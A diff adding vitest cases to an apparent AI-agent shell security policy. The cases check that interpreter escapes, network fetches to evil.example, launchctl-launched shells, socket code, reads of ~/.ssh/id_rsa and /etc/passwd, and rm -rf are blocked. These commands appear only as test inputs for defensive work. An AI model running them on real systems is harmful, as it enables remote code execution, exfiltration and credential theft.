@@ -1,8 +1,11 @@
 import { describe, it, expect } from "vitest";
+import { homedir } from "node:os";
+import { join } from "node:path";
 import {
   evaluateShellCommand,
   detectObfuscation,
 } from "../src/security/shell-policy.js";
+import { evaluateShellCommandAndPaths } from "../src/security/shell-path-guard.js";
 
 const isWin = process.platform === "win32";
 
@@ -277,5 +280,124 @@ describe("evaluateShellCommand — structured/synthesized shell paths", () => {
 
   it("allows a benign synthesized command", () => {
     expect(evaluateShellCommand(["ls", "-la"].join(" ")).allowed).toBe(true);
+  });
+});
+
+// ── Round-3 red-team hardening (C3-3 / C3-12 / C3-13 / C3-14 / C3-17) ──
+
+describe("evaluateShellCommand — C3-13 argv-aware interpreter escapes", () => {
+  it("still blocks the bare form `perl -e`", () => {
+    expect(evaluateShellCommand("perl -e 'print 1'").allowed).toBe(false);
+  });
+  it("blocks `perl -w -e` (intervening -w flag)", () => {
+    expect(evaluateShellCommand("perl -w -e 'print 1'").allowed).toBe(false);
+  });
+  it("blocks `perl -Mstrict -e` (intervening -M flag)", () => {
+    expect(evaluateShellCommand("perl -Mstrict -e 'print 1'").allowed).toBe(false);
+  });
+  it("blocks `ruby -rsocket -e` (clustered require + eval)", () => {
+    expect(evaluateShellCommand("ruby -rsocket -e 'puts 1'").allowed).toBe(false);
+  });
+  it("blocks `ruby -w -e`", () => {
+    expect(evaluateShellCommand("ruby -w -e 'puts 1'").allowed).toBe(false);
+  });
+  it("blocks the clustered short-flag form `perl -we`", () => {
+    expect(evaluateShellCommand("perl -we 'print 1'").allowed).toBe(false);
+  });
+  it("blocks `/usr/bin/ruby -rsocket -e` via path-prefixed argv[0]", () => {
+    expect(evaluateShellCommand("/usr/bin/ruby -rsocket -e 'puts 1'").allowed).toBe(false);
+  });
+  it("does NOT block a non-eval interpreter invocation (`ruby script.rb`)", () => {
+    expect(evaluateShellCommand("ruby script.rb").allowed).toBe(true);
+  });
+});
+
+describe("evaluateShellCommand — C3-12/C3-14 new network/persistence binaries", () => {
+  it("blocks `aria2c`", () => {
+    expect(evaluateShellCommand("aria2c https://evil.example/x").allowed).toBe(false);
+  });
+  it("blocks `tftp`", () => {
+    expect(evaluateShellCommand("tftp evil.example").allowed).toBe(false);
+  });
+  it("blocks metachar-free launchctl argv-RCE `launchctl submit -- /bin/sh -c id`", () => {
+    expect(evaluateShellCommand("launchctl submit -l x -- /bin/sh -c id").allowed).toBe(false);
+  });
+  it("blocks leading HTTPie `http example.com` (argv[0])", () => {
+    expect(evaluateShellCommand("http example.com/data").allowed).toBe(false);
+  });
+  it("blocks leading `xh` and `fetch` clients (argv[0])", () => {
+    expect(evaluateShellCommand("xh example.com").allowed).toBe(false);
+    expect(evaluateShellCommand("fetch https://evil.example/x").allowed).toBe(false);
+  });
+  it("does NOT block `git fetch` (fetch is not argv[0], it is a git subcommand)", () => {
+    expect(evaluateShellCommand("git fetch origin").allowed).toBe(true);
+  });
+  it("does NOT block the http_request-style word (http_request is a tool, not a shell client)", () => {
+    // `http_request` must not be caught by the `http` argv[0] rule — basename is
+    // "http_request", not "http". (Used here only as a benign leading token.)
+    expect(evaluateShellCommand("echo http_request").allowed).toBe(true);
+  });
+});
+
+describe("evaluateShellCommand — C3-17 raw sockets in inline interpreter bodies", () => {
+  it("blocks `node -e` requiring net", () => {
+    expect(evaluateShellCommand('node -e "require(\'net\').connect(80,\'evil\')"').allowed).toBe(false);
+  });
+  it("blocks `python3 -c` importing socket", () => {
+    expect(evaluateShellCommand('python3 -c "import socket; socket.socket()"').allowed).toBe(false);
+  });
+  it("blocks `node -e` calling global fetch()", () => {
+    expect(evaluateShellCommand('node -e "fetch(\'https://evil\')"').allowed).toBe(false);
+  });
+  it("does NOT block a benign `python3 -c` that only does math", () => {
+    expect(evaluateShellCommand('python3 -c "print(2+2)"').allowed).toBe(true);
+  });
+});
+
+describe("evaluateShellCommand — legitimate commands stay allowed", () => {
+  for (const cmd of ["ls -la", "git status", "cat README.md", "grep -r foo src"]) {
+    it(`allows \`${cmd}\``, () => {
+      expect(evaluateShellCommand(cmd).allowed).toBe(true);
+    });
+  }
+});
+
+// C3-3: the shell-class path (process_start / process_restart) and the bash
+// path BOTH call evaluateShellCommandAndPaths, so process_start now inherits the
+// SAME file-access confinement bash has — it can no longer `cat ~/.ssh/id_rsa`
+// in a mode where bash cannot. We exercise the shared helper directly (the exact
+// function both call sites invoke) to prove the two-step gate is applied.
+describe("evaluateShellCommandAndPaths — C3-3 shared shell+path confinement", () => {
+  const ctx = {
+    workspace: process.cwd(),
+    fileAccessMode: "common" as const,
+    allowedPathCheck: () => false,
+    sessionId: undefined,
+  };
+
+  it("blocks reading ~/.ssh/id_rsa in common mode (sensitive path)", () => {
+    const r = evaluateShellCommandAndPaths(`cat ${join(homedir(), ".ssh/id_rsa")}`, ctx);
+    expect(r.allowed).toBe(false);
+  });
+
+  it("blocks reading /etc/passwd outside the boundary in common mode", () => {
+    const r = evaluateShellCommandAndPaths("cat /etc/passwd", ctx);
+    expect(r.allowed).toBe(false);
+  });
+
+  it("still runs the command-content denylist (rm -rf blocked before paths)", () => {
+    const r = evaluateShellCommandAndPaths("rm -rf /tmp/x", ctx);
+    expect(r.allowed).toBe(false);
+  });
+
+  it("allows a benign in-workspace command", () => {
+    const r = evaluateShellCommandAndPaths("ls -la", ctx);
+    expect(r.allowed).toBe(true);
+  });
+
+  it("is a no-op for path confinement in unrestricted mode but still vets the command", () => {
+    const unrestricted = { ...ctx, fileAccessMode: "unrestricted" as const };
+    expect(evaluateShellCommandAndPaths("cat /etc/passwd", unrestricted).allowed).toBe(true);
+    expect(evaluateShellCommandAndPaths("rm -rf /tmp/x", unrestricted).allowed).toBe(false);
   });
 });
